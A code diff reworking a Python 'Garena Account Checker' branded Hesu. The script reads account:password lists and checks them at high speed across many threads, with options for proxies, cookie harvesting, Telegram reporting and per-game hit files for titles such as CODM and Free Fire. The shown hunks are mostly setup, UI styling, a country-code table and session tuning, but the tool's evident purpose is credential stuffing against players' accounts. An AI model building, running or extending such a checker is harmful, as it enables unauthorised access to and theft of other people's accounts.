@@ -1,24 +1,74 @@
-import io
+#!/usr/bin/env python3
+# -*- coding: utf-8 -*-
+"""
+Hesu — Garena Account Checker
+Redesigned console UI · Hesu branding · by @dvlist
+"""
+from __future__ import annotations
+
+# ── Auto-install missing packages ────────────────────────────────────────────
+def _auto_install():
+    import importlib, subprocess, sys
+
+    # (import_name, pip_package_name)
+    _REQUIRED = [
+        ("colorama",     "colorama"),
+        ("requests",     "requests"),
+        ("Crypto",       "pycryptodome"),
+        ("rich",         "rich"),
+    ]
+
+    missing = []
+    for mod, pkg in _REQUIRED:
+        try:
+            importlib.import_module(mod)
+        except ModuleNotFoundError:
+            missing.append(pkg)
+
+    if not missing:
+        return
+
+    print(f"\n  \033[93m⚡\033[0m  Installing missing packages: "
+          f"\033[1m{', '.join(missing)}\033[0m\n")
+
+    for pkg in missing:
+        print(f"  \033[2m→ pip install {pkg}\033[0m")
+        result = subprocess.run(
+            [sys.executable, "-m", "pip", "install", "--quiet", pkg],
+            capture_output=True, text=True
+        )
+        if result.returncode == 0:
+            print(f"  \033[92m✔\033[0m  {pkg} installed")
+        else:
+            print(f"  \033[91m✖\033[0m  Failed to install {pkg}:")
+            if result.stderr.strip():
+                for ln in result.stderr.strip().splitlines()[-3:]:
+                    print(f"       \033[2m{ln}\033[0m")
+            print(f"\n  Run manually:  pip install {pkg}\n")
+
+    print()
+
+_auto_install()
+# ─────────────────────────────────────────────────────────────────────────────
+
+import hashlib
+import json
+import logging
+import threading
+import random
 import os
 import re
 import sys
 import time
-import json
-import uuid
-import base64
-import hashlib
-import logging
-import random
-import shutil
-import signal
-import socket
-import threading
 import urllib.parse
-from collections import deque
+import signal
+import shutil
+import base64
+import socket
 from concurrent.futures import ThreadPoolExecutor, as_completed
 from datetime import datetime
 from pathlib import Path
-from threading import Lock, Event, Thread
+from collections import deque
 from typing import Any, List, Optional, Dict, Tuple
 
 import colorama
@@ -27,167 +77,226 @@ import requests
 from Crypto.Cipher import AES
 
 from rich import print as rprint
-from rich import box
-from rich.align import Align
-from rich.box import Box, DOUBLE, HEAVY, ROUNDED
-from rich.columns import Columns
 from rich.console import Console
-from rich.layout import Layout
-from rich.live import Live
-from rich.padding import Padding
 from rich.panel import Panel
 from rich.progress import (
-    BarColumn,
-    MofNCompleteColumn,
-    Progress,
-    SpinnerColumn,
-    TextColumn,
-    TimeElapsedColumn,
-    TimeRemainingColumn,
+    BarColumn, MofNCompleteColumn, Progress,
+    SpinnerColumn, TextColumn, TimeElapsedColumn, TimeRemainingColumn,
 )
-from rich.prompt import Confirm
-from rich.rule import Rule
 from rich.table import Table
 from rich.text import Text
-
-card = ROUNDED
-
-try:
-    import pyfiglet as pyfig
-    fig = True
-except ImportError:
-    fig = False
+from rich.box import Box, DOUBLE, HEAVY, ROUNDED
+from rich.columns import Columns
+from rich.align import Align
+from rich.padding import Padding
+from rich import box
 
 colorama.init(autoreset=True)
 
-def tint(ch, r1, g1, b1, r2, g2, b2, t):
+def _grad_char(ch, r1, g1, b1, r2, g2, b2, t):
     r = int(r1 + (r2 - r1) * t)
     g = int(g1 + (g2 - g1) * t)
     b = int(b1 + (b2 - b1) * t)
     return f'\033[38;2;{r};{g};{b}m{ch}\033[0m'
 
-def shade(text, r1=180, g1=0, b1=255, r2=255, g2=80, b2=200):
+def _grad_str(text, r1=180, g1=0, b1=255, r2=255, g2=80, b2=200):
     n = max(len(text) - 1, 1)
-    return ''.join(
-        tint(ch, r1, g1, b1, r2, g2, b2, i / n)
-        for i, ch in enumerate(text)
-    )
+    return ''.join(_grad_char(ch, r1, g1, b1, r2, g2, b2, i / n) for i, ch in enumerate(text))
 
-ver = '\033[38;2;255;200;80m'
-by = '\033[38;2;160;160;160m'
-at = '\033[38;2;255;80;200m'
+_GRAD_VER = '\033[96m'   # warm gold (version)
+_GRAD_BY  = '\033[90m' # soft gray (by)
+_GRAD_AT  = '\033[38;5;139m'  # soft purple-gray
+
 
 console = Console()
-disk = shutil
+_shutil_ui = shutil
 
-cy = _F.CYAN + _S.BRIGHT
-gn = _F.GREEN + _S.BRIGHT
-rd = _F.RED + _S.BRIGHT
-yl = _F.YELLOW + _S.BRIGHT
-mg = _F.MAGENTA + _S.BRIGHT
-wh = _F.WHITE + _S.BRIGHT
-blu = _F.BLUE + _S.BRIGHT
-dim = _S.DIM
-rst = _S.RESET_ALL
-brt = _S.BRIGHT
-itl = "\033[3m"
-sl = "\033[38;5;240m"
-gr = "\033[38;5;114m"
-gd = "\033[38;5;222m"
-p = 'bold bright_magenta'
-s = 'bold bright_magenta'
-ok = 'bold bright_green'
-er = 'bold bright_red'
-wn = 'bold yellow'
-mu = 'dim'
-tx = 'bright_white'
-bl = 'magenta'
+# ── Hesu Neon palette ────────────────────────────────────────────────────
+# Primary: bright cyan · Brand accent: bright magenta · Success: neon green
+_CY  = _F.CYAN     + _S.BRIGHT   # primary
+_GN  = _F.GREEN    + _S.BRIGHT   # success
+_RD  = _F.RED      + _S.BRIGHT   # error
+_YL  = _F.YELLOW   + _S.BRIGHT   # warning
+_MG  = _F.MAGENTA  + _S.BRIGHT   # brand accent
+_WH  = _F.WHITE    + _S.BRIGHT   # text
+_BLU = _F.BLUE     + _S.BRIGHT   # info
+_PK  = "\033[38;5;213m"          # pink highlight
+_OR  = "\033[38;5;208m"          # orange highlight
+_DIM = _S.DIM
+_RST = _S.RESET_ALL
+_BRT = _S.BRIGHT
+_ITL = "\033[3m"
+_SL  = "\033[38;5;245m"
+_GR  = "\033[38;5;117m"
+_GD  = "\033[38;5;222m"
+# Rich style strings (new theme: cyan primary, magenta brand)
+P  = 'bold cyan'
+S  = 'bold bright_cyan'
+OK = 'bold bright_green'
+ER = 'bold bright_red'
+WN = 'bold yellow'
+MU = 'dim'
+TX = 'bright_white'
+BL = 'cyan'
 
-def span():
-    return disk.get_terminal_size((80, 24)).columns
+def _tw():
+    return _shutil_ui.get_terminal_size((80, 24)).columns
 
-def measure(n=72):
-    return min(span() - 4, n)
+def _w(n=72):
+    return min(_tw() - 4, n)
 
-def stamp():
+def _ts():
     return datetime.now().strftime('%H:%M:%S')
 
-def gauge(text):
+def _visible_len(text):
+    import re
     return len(re.sub(r'\x1b\[[0-9;]*m', '', str(text)))
 
-def sieve(text):
-    return re.sub(r'\[/?[^\]]+\]', '', str(text))
+def _strip_rich(text):
+    return re.sub('\\[/?[^\\]]+\\]', '', str(text))
 
-def herald(level: str, msg: str, indent: str = '  '):
-    col, icon = icons.get(level, (dim, '·'))
-    clean = sieve(msg)
-    print(f'{indent}{col}{icon}{rst}  {clean}')
-
-icons = {
-    'INFO': (cy, 'ℹ'),
-    'SUCCESS': (gn, '✔'),
-    'WARNING': (yl, '⚠'),
-    'ERROR': (rd, '✖'),
-    'DEBUG': (dim, '·'),
-    'REQUEST': (cy, '→'),
-    'RESPONSE': (cy, '←'),
-    'RETRY': (yl, '↺'),
-    'PROXY': (mg, '⬡'),
-    'THREAD': (mg, '⧫'),
-    'SAVE': (gn, '⬇')
+_LOG_ICONS = {
+    'INFO':     (_CY, 'ℹ'),
+    'SUCCESS':  (_GN, '✔'),
+    'WARNING':  (_YL, '⚠'),
+    'ERROR':    (_RD, '✖'),
+    'DEBUG':    (_DIM, '·'),
+    'REQUEST':  (_CY, '→'),
+    'RESPONSE': (_CY, '←'),
+    'RETRY':    (_YL, '↺'),
+    'PROXY':    (_MG, '⬡'),
+    'THREAD':   (_MG, '⧫'),
+    'SAVE':     (_GN, '⬇'),
 }
 
-threads = {
-    '1': {'threads': 1, 'label': '1  thread   — Safe, slower', 'icon': ''},
-    '2': {'threads': 3, 'label': '3  threads  — Balanced', 'icon': ''},
-    '3': {'threads': 5, 'label': '5  threads  — Fast', 'icon': ''},
-    '4': {'threads': 10, 'label': '10 threads  — Very fast', 'icon': ''},
-    '5': {'threads': 15, 'label': '15 threads  — Max speed', 'icon': ''}
-}
 
-telegram = False
-teleconfig = None
-harvest = False
-bulk = 'full'
-scrolllock = threading.Lock()
-scrolllines = deque(maxlen=500)
-dashlock = threading.Lock()
-active = None
+def _log(level: str, msg: str, indent: str = '  '):
+    col, icon = _LOG_ICONS.get(level, (_DIM, '·'))
+    clean = _strip_rich(msg)
+    print(f'{indent}{col}{icon}{_RST}  {clean}')
 
-def stream(line: str):
-    with scrolllock:
-        scrolllines.append(line)
+def _prompt_box(body, title, border='bright_cyan', title_color=None,
+                box_style=None, indent=2):
+    """Rich Panel prompt — soft rounded/heavy box with per-section border color."""
+    from rich.panel import Panel
+    from rich.padding import Padding
+    from rich import box as _box
+    bs = box_style if box_style is not None else _box.ROUNDED
+    tc = title_color or border
+    console.print(Padding(
+        Panel(body,
+              title=f'[bold {tc}]{title}[/bold {tc}]',
+              border_style=border, box=bs, expand=False),
+        (0, 0, 0, indent)
+    ))
+
+THREAD_CONFIGS = {'1': {'threads': 1, 'label': '1  thread   — Safe, slower', 'icon': ''}, '2': {'threads': 3, 'label': '3  threads  — Balanced', 'icon': ''}, '3': {'threads': 5, 'label': '5  threads  — Fast', 'icon': ''}, '4': {'threads': 10, 'label': '10 threads  — Very fast (risk)', 'icon': ''}, '5': {'threads': 15, 'label': '15 threads  — Max speed (high risk)', 'icon': ''}}
+CARD = Box('┏━━┓\n┃  ┃\n┣━━┫\n┃  ┃\n┣━━┫\n┣━━┫\n┃  ┃\n┗━━┛\n')
+telegram_enabled = False
+_telegram_config = None
+
+# ── Nexora-style UI globals ──────────────────────────────────────────────
+HARVEST_COOKIES = False
+_BULK_MODE = 'full'                     # 'full' | 'semi' | 'none'
+_DISPLAY_MODE = 'dashboard'             # 'dashboard' | 'both'
+_scroll_lock = threading.Lock()
+_scroll_lines = deque(maxlen=500)
+_dash_print_lock = threading.Lock()
+_active_dashboard = None
+
+def _raw_write(s: str):
+    """Write directly to the real terminal, bypassing colorama's wrapper.
+
+    colorama.init(autoreset=True) wraps sys.stdout with a StreamWrapper
+    that intercepts ANSI escape sequences. This is fine for color codes,
+    but it strips/breaks cursor-control and scroll-region sequences
+    (\x1b[1;Nr, \x1b[N;1H, \x1b[0J, etc.).
+
+    For terminal control sequences, we must write to the underlying stream.
+    """
+    stream = getattr(sys.stdout, '_StreamWrapper__wrapped', None)
+    if stream is None:
+        stream = getattr(sys.stdout, 'stream', None)
+    if stream is None:
+        stream = sys.stdout
+    try:
+        stream.write(s)
+    except Exception:
+        try:
+            sys.__stdout__.write(s)
+        except Exception:
+            pass
+
+def _raw_flush():
+    """Flush the underlying stream (bypassing colorama)."""
+    stream = getattr(sys.stdout, '_StreamWrapper__wrapped', None)
+    if stream is None:
+        stream = getattr(sys.stdout, 'stream', None)
+    if stream is None:
+        stream = sys.stdout
+    try:
+        stream.flush()
+    except Exception:
+        pass
+
+def _scroll_print(line: str):
+    """Print a line above the fixed-bottom dashboard without disturbing it."""
+    with _scroll_lock:
+        _scroll_lines.append(line)
     sys.stdout.write(line + '\n')
     sys.stdout.flush()
+# ─────────────────────────────────────────────────────────────────────────
 
-regions = {
-    'BN': {'name': 'Brunei', 'code': '673'},
-    'KH': {'name': 'Cambodia', 'code': '855'},
-    'HK': {'name': 'Hong Kong', 'code': '852'},
-    'ID': {'name': 'Indonesia', 'code': '62'},
-    'LA': {'name': 'Laos', 'code': '856'},
-    'MO': {'name': 'Macau', 'code': '853'},
-    'MY': {'name': 'Malaysia', 'code': '60'},
-    'MM': {'name': 'Myanmar', 'code': '95'},
-    'PH': {'name': 'Philippines', 'code': '63'},
-    'SG': {'name': 'Singapore', 'code': '65'},
-    'TW': {'name': 'Taiwan', 'code': '886'},
-    'TH': {'name': 'Thailand', 'code': '66'}
-}
+CODM_REGIONS = {'AF':{'name':'Afghanistan','code':'93','flag':'🇦🇫'},'AL':{'name':'Albania','code':'355','flag':'🇦🇱'},'DZ':{'name':'Algeria','code':'213','flag':'🇩🇿'},'AD':{'name':'Andorra','code':'376','flag':'🇦🇩'},'AO':{'name':'Angola','code':'244','flag':'🇦🇴'},'AG':{'name':'Antigua and Barbuda','code':'1','flag':'🇦🇬'},'AR':{'name':'Argentina','code':'54','flag':'🇦🇷'},'AM':{'name':'Armenia','code':'374','flag':'🇦🇲'},'AU':{'name':'Australia','code':'61','flag':'🇦🇺'},'AT':{'name':'Austria','code':'43','flag':'🇦🇹'},'AZ':{'name':'Azerbaijan','code':'994','flag':'🇦🇿'},'BS':{'name':'Bahamas','code':'1','flag':'🇧🇸'},'BH':{'name':'Bahrain','code':'973','flag':'🇧🇭'},'BD':{'name':'Bangladesh','code':'880','flag':'🇧🇩'},'BB':{'name':'Barbados','code':'1','flag':'🇧🇧'},'BY':{'name':'Belarus','code':'375','flag':'🇧🇾'},'BE':{'name':'Belgium','code':'32','flag':'🇧🇪'},'BZ':{'name':'Belize','code':'501','flag':'🇧🇿'},'BJ':{'name':'Benin','code':'229','flag':'🇧🇯'},'BT':{'name':'Bhutan','code':'975','flag':'🇧🇹'},'BO':{'name':'Bolivia','code':'591','flag':'🇧🇴'},'BA':{'name':'Bosnia and Herzegovina','code':'387','flag':'🇧🇦'},'BW':{'name':'Botswana','code':'267','flag':'🇧🇼'},'BR':{'name':'Brazil','code':'55','flag':'🇧🇷'},'BN':{'name':'Brunei','code':'673','flag':'🇧🇳'},'BG':{'name':'Bulgaria','code':'359','flag':'🇧🇬'},'BF':{'name':'Burkina Faso','code':'226','flag':'🇧🇫'},'BI':{'name':'Burundi','code':'257','flag':'🇧🇮'},'KH':{'name':'Cambodia','code':'855','flag':'🇰🇭'},'CM':{'name':'Cameroon','code':'237','flag':'🇨🇲'},'CA':{'name':'Canada','code':'1','flag':'🇨🇦'},'CV':{'name':'Cape Verde','code':'238','flag':'🇨🇻'},'CF':{'name':'Central African Republic','code':'236','flag':'🇨🇫'},'TD':{'name':'Chad','code':'235','flag':'🇹🇩'},'CL':{'name':'Chile','code':'56','flag':'🇨🇱'},'CN':{'name':'China','code':'86','flag':'🇨🇳'},'CO':{'name':'Colombia','code':'57','flag':'🇨🇴'},'KM':{'name':'Comoros','code':'269','flag':'🇰🇲'},'CG':{'name':'Congo','code':'242','flag':'🇨🇬'},'CD':{'name':'Congo (DRC)','code':'243','flag':'🇨🇩'},'CR':{'name':'Costa Rica','code':'506','flag':'🇨🇷'},'CI':{'name':"Côte d'Ivoire",'code':'225','flag':'🇨🇮'},'HR':{'name':'Croatia','code':'385','flag':'🇭🇷'},'CU':{'name':'Cuba','code':'53','flag':'🇨🇺'},'CY':{'name':'Cyprus','code':'357','flag':'🇨🇾'},'CZ':{'name':'Czech Republic','code':'420','flag':'🇨🇿'},'DK':{'name':'Denmark','code':'45','flag':'🇩🇰'},'DJ':{'name':'Djibouti','code':'253','flag':'🇩🇯'},'DM':{'name':'Dominica','code':'1','flag':'🇩🇲'},'DO':{'name':'Dominican Republic','code':'1','flag':'🇩🇴'},'EC':{'name':'Ecuador','code':'593','flag':'🇪🇨'},'EG':{'name':'Egypt','code':'20','flag':'🇪🇬'},'SV':{'name':'El Salvador','code':'503','flag':'🇸🇻'},'GQ':{'name':'Equatorial Guinea','code':'240','flag':'🇬🇶'},'ER':{'name':'Eritrea','code':'291','flag':'🇪🇷'},'EE':{'name':'Estonia','code':'372','flag':'🇪🇪'},'SZ':{'name':'Eswatini','code':'268','flag':'🇸🇿'},'ET':{'name':'Ethiopia','code':'251','flag':'🇪🇹'},'FJ':{'name':'Fiji','code':'679','flag':'🇫🇯'},'FI':{'name':'Finland','code':'358','flag':'🇫🇮'},'FR':{'name':'France','code':'33','flag':'🇫🇷'},'GA':{'name':'Gabon','code':'241','flag':'🇬🇦'},'GM':{'name':'Gambia','code':'220','flag':'🇬🇲'},'GE':{'name':'Georgia','code':'995','flag':'🇬🇪'},'DE':{'name':'Germany','code':'49','flag':'🇩🇪'},'GH':{'name':'Ghana','code':'233','flag':'🇬🇭'},'GR':{'name':'Greece','code':'30','flag':'🇬🇷'},'GD':{'name':'Grenada','code':'1','flag':'🇬🇩'},'GT':{'name':'Guatemala','code':'502','flag':'🇬🇹'},'GN':{'name':'Guinea','code':'224','flag':'🇬🇳'},'GW':{'name':'Guinea-Bissau','code':'245','flag':'🇬🇼'},'GY':{'name':'Guyana','code':'592','flag':'🇬🇾'},'HT':{'name':'Haiti','code':'509','flag':'🇭🇹'},'HN':{'name':'Honduras','code':'504','flag':'🇭🇳'},'HK':{'name':'Hong Kong','code':'852','flag':'🇭🇰'},'HU':{'name':'Hungary','code':'36','flag':'🇭🇺'},'IS':{'name':'Iceland','code':'354','flag':'🇮🇸'},'IN':{'name':'India','code':'91','flag':'🇮🇳'},'ID':{'name':'Indonesia','code':'62','flag':'🇮🇩'},'IR':{'name':'Iran','code':'98','flag':'🇮🇷'},'IQ':{'name':'Iraq','code':'964','flag':'🇮🇶'},'IE':{'name':'Ireland','code':'353','flag':'🇮🇪'},'IL':{'name':'Israel','code':'972','flag':'🇮🇱'},'IT':{'name':'Italy','code':'39','flag':'🇮🇹'},'JM':{'name':'Jamaica','code':'1','flag':'🇯🇲'},'JP':{'name':'Japan','code':'81','flag':'🇯🇵'},'JO':{'name':'Jordan','code':'962','flag':'🇯🇴'},'KZ':{'name':'Kazakhstan','code':'7','flag':'🇰🇿'},'KE':{'name':'Kenya','code':'254','flag':'🇰🇪'},'KI':{'name':'Kiribati','code':'686','flag':'🇰🇮'},'KR':{'name':'South Korea','code':'82','flag':'🇰🇷'},'KW':{'name':'Kuwait','code':'965','flag':'🇰🇼'},'KG':{'name':'Kyrgyzstan','code':'996','flag':'🇰🇬'},'LA':{'name':'Laos','code':'856','flag':'🇱🇦'},'LV':{'name':'Latvia','code':'371','flag':'🇱🇻'},'LB':{'name':'Lebanon','code':'961','flag':'🇱🇧'},'LS':{'name':'Lesotho','code':'266','flag':'🇱🇸'},'LR':{'name':'Liberia','code':'231','flag':'🇱🇷'},'LY':{'name':'Libya','code':'218','flag':'🇱🇾'},'LI':{'name':'Liechtenstein','code':'423','flag':'🇱🇮'},'LT':{'name':'Lithuania','code':'370','flag':'🇱🇹'},'LU':{'name':'Luxembourg','code':'352','flag':'🇱🇺'},'MO':{'name':'Macau','code':'853','flag':'🇲🇴'},'MG':{'name':'Madagascar','code':'261','flag':'🇲🇬'},'MW':{'name':'Malawi','code':'265','flag':'🇲🇼'},'MY':{'name':'Malaysia','code':'60','flag':'🇲🇾'},'MV':{'name':'Maldives','code':'960','flag':'🇲🇻'},'ML':{'name':'Mali','code':'223','flag':'🇲🇱'},'MT':{'name':'Malta','code':'356','flag':'🇲🇹'},'MH':{'name':'Marshall Islands','code':'692','flag':'🇲🇭'},'MR':{'name':'Mauritania','code':'222','flag':'🇲🇷'},'MU':{'name':'Mauritius','code':'230','flag':'🇲🇺'},'MX':{'name':'Mexico','code':'52','flag':'🇲🇽'},'FM':{'name':'Micronesia','code':'691','flag':'🇫🇲'},'MD':{'name':'Moldova','code':'373','flag':'🇲🇩'},'MC':{'name':'Monaco','code':'377','flag':'🇲🇨'},'MN':{'name':'Mongolia','code':'976','flag':'🇲🇳'},'ME':{'name':'Montenegro','code':'382','flag':'🇲🇪'},'MA':{'name':'Morocco','code':'212','flag':'🇲🇦'},'MZ':{'name':'Mozambique','code':'258','flag':'🇲🇿'},'MM':{'name':'Myanmar','code':'95','flag':'🇲🇲'},'NA':{'name':'Namibia','code':'264','flag':'🇳🇦'},'NR':{'name':'Nauru','code':'674','flag':'🇳🇷'},'NP':{'name':'Nepal','code':'977','flag':'🇳🇵'},'NL':{'name':'Netherlands','code':'31','flag':'🇳🇱'},'NZ':{'name':'New Zealand','code':'64','flag':'🇳🇿'},'NI':{'name':'Nicaragua','code':'505','flag':'🇳🇮'},'NE':{'name':'Niger','code':'227','flag':'🇳🇪'},'NG':{'name':'Nigeria','code':'234','flag':'🇳🇬'},'MK':{'name':'North Macedonia','code':'389','flag':'🇲🇰'},'NO':{'name':'Norway','code':'47','flag':'🇳🇴'},'OM':{'name':'Oman','code':'968','flag':'🇴🇲'},'PK':{'name':'Pakistan','code':'92','flag':'🇵🇰'},'PW':{'name':'Palau','code':'680','flag':'🇵🇼'},'PA':{'name':'Panama','code':'507','flag':'🇵🇦'},'PG':{'name':'Papua New Guinea','code':'675','flag':'🇵🇬'},'PY':{'name':'Paraguay','code':'595','flag':'🇵🇾'},'PE':{'name':'Peru','code':'51','flag':'🇵🇪'},'PH':{'name':'Philippines','code':'63','flag':'🇵🇭'},'PL':{'name':'Poland','code':'48','flag':'🇵🇱'},'PT':{'name':'Portugal','code':'351','flag':'🇵🇹'},'QA':{'name':'Qatar','code':'974','flag':'🇶🇦'},'RO':{'name':'Romania','code':'40','flag':'🇷🇴'},'RU':{'name':'Russia','code':'7','flag':'🇷🇺'},'RW':{'name':'Rwanda','code':'250','flag':'🇷🇼'},'KN':{'name':'Saint Kitts and Nevis','code':'1','flag':'🇰🇳'},'LC':{'name':'Saint Lucia','code':'1','flag':'🇱🇨'},'VC':{'name':'Saint Vincent and the Grenadines','code':'1','flag':'🇻🇨'},'WS':{'name':'Samoa','code':'685','flag':'🇼🇸'},'SM':{'name':'San Marino','code':'378','flag':'🇸🇲'},'ST':{'name':'São Tomé and Príncipe','code':'239','flag':'🇸🇹'},'SA':{'name':'Saudi Arabia','code':'966','flag':'🇸🇦'},'SN':{'name':'Senegal','code':'221','flag':'🇸🇳'},'RS':{'name':'Serbia','code':'381','flag':'🇷🇸'},'SC':{'name':'Seychelles','code':'248','flag':'🇸🇨'},'SL':{'name':'Sierra Leone','code':'232','flag':'🇸🇱'},'SG':{'name':'Singapore','code':'65','flag':'🇸🇬'},'SK':{'name':'Slovakia','code':'421','flag':'🇸🇰'},'SI':{'name':'Slovenia','code':'386','flag':'🇸🇮'},'SB':{'name':'Solomon Islands','code':'677','flag':'🇸🇧'},'SO':{'name':'Somalia','code':'252','flag':'🇸🇴'},'ZA':{'name':'South Africa','code':'27','flag':'🇿🇦'},'SS':{'name':'South Sudan','code':'211','flag':'🇸🇸'},'ES':{'name':'Spain','code':'34','flag':'🇪🇸'},'LK':{'name':'Sri Lanka','code':'94','flag':'🇱🇰'},'SD':{'name':'Sudan','code':'249','flag':'🇸🇩'},'SR':{'name':'Suriname','code':'597','flag':'🇸🇷'},'SE':{'name':'Sweden','code':'46','flag':'🇸🇪'},'CH':{'name':'Switzerland','code':'41','flag':'🇨🇭'},'SY':{'name':'Syria','code':'963','flag':'🇸🇾'},'TW':{'name':'Taiwan','code':'886','flag':'🇹🇼'},'TJ':{'name':'Tajikistan','code':'992','flag':'🇹🇯'},'TZ':{'name':'Tanzania','code':'255','flag':'🇹🇿'},'TH':{'name':'Thailand','code':'66','flag':'🇹🇭'},'TL':{'name':'Timor-Leste','code':'670','flag':'🇹🇱'},'TG':{'name':'Togo','code':'228','flag':'🇹🇬'},'TO':{'name':'Tonga','code':'676','flag':'🇹🇴'},'TT':{'name':'Trinidad and Tobago','code':'1','flag':'🇹🇹'},'TN':{'name':'Tunisia','code':'216','flag':'🇹🇳'},'TR':{'name':'Turkey','code':'90','flag':'🇹🇷'},'TM':{'name':'Turkmenistan','code':'993','flag':'🇹🇲'},'TV':{'name':'Tuvalu','code':'688','flag':'🇹🇻'},'UG':{'name':'Uganda','code':'256','flag':'🇺🇬'},'UA':{'name':'Ukraine','code':'380','flag':'🇺🇦'},'AE':{'name':'United Arab Emirates','code':'971','flag':'🇦🇪'},'GB':{'name':'United Kingdom','code':'44','flag':'🇬🇧'},'US':{'name':'United States','code':'1','flag':'🇺🇸'},'UY':{'name':'Uruguay','code':'598','flag':'🇺🇾'},'UZ':{'name':'Uzbekistan','code':'998','flag':'🇺🇿'},'VU':{'name':'Vanuatu','code':'678','flag':'🇻🇺'},'VA':{'name':'Vatican City','code':'39','flag':'🇻🇦'},'VE':{'name':'Venezuela','code':'58','flag':'🇻🇪'},'VN':{'name':'Vietnam','code':'84','flag':'🇻🇳'},'YE':{'name':'Yemen','code':'967','flag':'🇾🇪'},'ZM':{'name':'Zambia','code':'260','flag':'🇿🇲'},'ZW':{'name':'Zimbabwe','code':'263','flag':'🇿🇼'}}
 
-def forge(pool=8):
+def _make_session(pool_size=64):
+    """Build a requests.Session tuned for high-throughput checking.
+
+    Args:
+        pool_size: max simultaneous connections per host. 64 is a good
+            default; raise it for very large thread pools.
+    """
     s = requests.Session()
+    # Transport-level retries: 1 retry on connection errors, with 0.3s
+    # backoff. This is faster than the manual Python-level retry loop,
+    # because urllib3 handles it in C while the GIL is released.
+    from urllib3.util.retry import Retry
+    retry = Retry(
+        total=1,
+        connect=1,
+        read=0,
+        status=0,
+        backoff_factor=0.3,
+        status_forcelist=[],
+        allowed_methods=['GET', 'POST'],
+    )
     adapter = requests.adapters.HTTPAdapter(
-        pool_connections=pool,
-        pool_maxsize=pool,
-        max_retries=0,
-        pool_block=False
+        pool_connections=pool_size,
+        pool_maxsize=pool_size,
+        max_retries=retry,
+        pool_block=True,            # wait for a free conn instead of failing
     )
     s.mount('http://', adapter)
     s.mount('https://', adapter)
     return s
 
-def scrub(text):
+
+_codm_tls = threading.local()
+
+def _get_codm_session():
+    """Per-thread keep-alive session for the CODM sub-check.
+
+    Reused across accounts so the TLS connection to the CODM/SSO hosts stays
+    warm instead of a fresh handshake on every valid hit.
+    """
+    s = getattr(_codm_tls, 'session', None)
+    if s is None:
+        s = _make_session(pool_size=4)
+        _codm_tls.session = s
+    return s
+
+
+def sanitize_string(text):
     if not text or text == 'N/A':
         return text
     try:
@@ -195,7 +304,7 @@ def scrub(text):
     except:
         return re.sub('[^\\x00-\\x7F]+', '', str(text))
 
-def pare(line):
+def clean_account_line(line):
     if not line:
         return (None, None)
     line = line.strip().lstrip('\ufeff\ufffe')
@@ -208,24 +317,25 @@ def pare(line):
             return (None, None)
         account = parts[0].strip()
         password = parts[1].strip()
-        account = scrub(account)
-        password = scrub(password)
+        account = sanitize_string(account)
+        password = sanitize_string(password)
         if not account or not password:
             return (None, None)
         return (account, password)
     except:
         return (None, None)
 
-def label(region_code):
+def format_codm_region(region_code):
     if not region_code or region_code == 'N/A':
         return 'N/A'
     region_code = region_code.upper()
-    region_info = regions.get(region_code)
+    region_info = CODM_REGIONS.get(region_code)
     if region_info:
-        return f"{region_info['name']} ({region_code})"
-    return f'{region_code}'
+        return f"{region_info['flag']} {region_info['name']} ({region_code})"
+    else:
+        return f'{region_code}'
 
-def mask(mobile_no, country_code=None):
+def format_mobile_number(mobile_no, country_code=None):
     if not mobile_no or mobile_no == 'N/A' or (not str(mobile_no).strip()):
         return 'N/A'
     mobile_str = str(mobile_no).strip()
@@ -238,7 +348,7 @@ def mask(mobile_no, country_code=None):
             else:
                 mobile_str = country_code + mobile_str
     detected_country_code = None
-    for code_key, region_info in regions.items():
+    for code_key, region_info in CODM_REGIONS.items():
         code = region_info['code']
         if mobile_str.startswith(code):
             detected_country_code = code
@@ -248,33 +358,22 @@ def mask(mobile_no, country_code=None):
         if len(local_number) >= 4:
             masked = '*' * (len(local_number) - 4) + local_number[-4:]
             return f'+{detected_country_code} {masked}'
-        return f'+{detected_country_code} {local_number}'
-    if len(mobile_str) >= 4:
+        else:
+            return f'+{detected_country_code} {local_number}'
+    elif len(mobile_str) >= 4:
         masked = '*' * (len(mobile_str) - 4) + mobile_str[-4:]
         return f'+{masked}'
-    return mobile_str
+    else:
+        return mobile_str
 
-def sever(sig, frame):
-    print(f'\n  {yl}⚠  Ctrl+C – exiting immediately…{rst}')
+def _sigint_handler(sig, frame):
+    print(f'\n  {_YL}⚠  Ctrl+C – exiting immediately…{_RST}')
     os._exit(0)
+signal.signal(signal.SIGINT, _sigint_handler)
 
-signal.signal(signal.SIGINT, sever)
-
-class Inker(logging.Formatter):
-    COLORS = {
-        'DEBUG': colorama.Fore.CYAN,
-        'INFO': colorama.Fore.CYAN,
-        'WARNING': colorama.Fore.YELLOW,
-        'ERROR': colorama.Fore.RED,
-        'CRITICAL': colorama.Fore.RED + colorama.Back.BLACK + colorama.Style.BRIGHT
-    }
-    ICONS = {
-        'DEBUG': '⊡',
-        'INFO': 'ℹ',
-        'WARNING': '⚠',
-        'ERROR': '✖',
-        'CRITICAL': '☠'
-    }
+class ColoredFormatter(logging.Formatter):
+    COLORS = {'DEBUG': colorama.Fore.CYAN, 'INFO': colorama.Fore.CYAN, 'WARNING': colorama.Fore.YELLOW, 'ERROR': colorama.Fore.RED, 'CRITICAL': colorama.Fore.RED + colorama.Back.BLACK + colorama.Style.BRIGHT}
+    ICONS = {'DEBUG': '⊡', 'INFO': 'ℹ', 'WARNING': '⚠', 'ERROR': '✖', 'CRITICAL': '☠'}
     RESET = colorama.Style.RESET_ALL
 
     def format(self, record):
@@ -288,143 +387,98 @@ class Inker(logging.Formatter):
 
 logger = logging.getLogger()
 handler = logging.StreamHandler()
-handler.setFormatter(Inker())
+handler.setFormatter(ColoredFormatter())
 logger.addHandler(handler)
 logger.setLevel(logging.INFO)
 logging.getLogger('urllib3').setLevel(logging.ERROR)
 logging.getLogger('requests').setLevel(logging.ERROR)
 
-default = 5
-other = False
+DEFAULT_THREADS = 30
+CHECK_OTHER_GAMES: bool = False
+GAME_FILE_MAP = {'CODM': 'CODM.txt', 'FREEFIRE': 'FreeFire.txt', 'FREE FIRE': 'FreeFire.txt', 'ROV': 'ROV.txt', 'DELTA FORCE': 'DeltaForce.txt', 'AOV': 'AOV.txt', 'SPEED DRIFTERS': 'SpeedDrifters.txt', 'BLACK CLOVER M': 'BlackCloverM.txt', 'GARENA UNDAWN': 'Undawn.txt', 'FC ONLINE': 'FCOnline.txt', 'FC ONLINE M': 'FCOnlineM.txt', 'MOONLIGHT BLADE': 'MoonlightBlade.txt', 'FAST THRILL': 'FastThrill.txt', 'THE WORLD OF WAR': 'WorldOfWar.txt'}
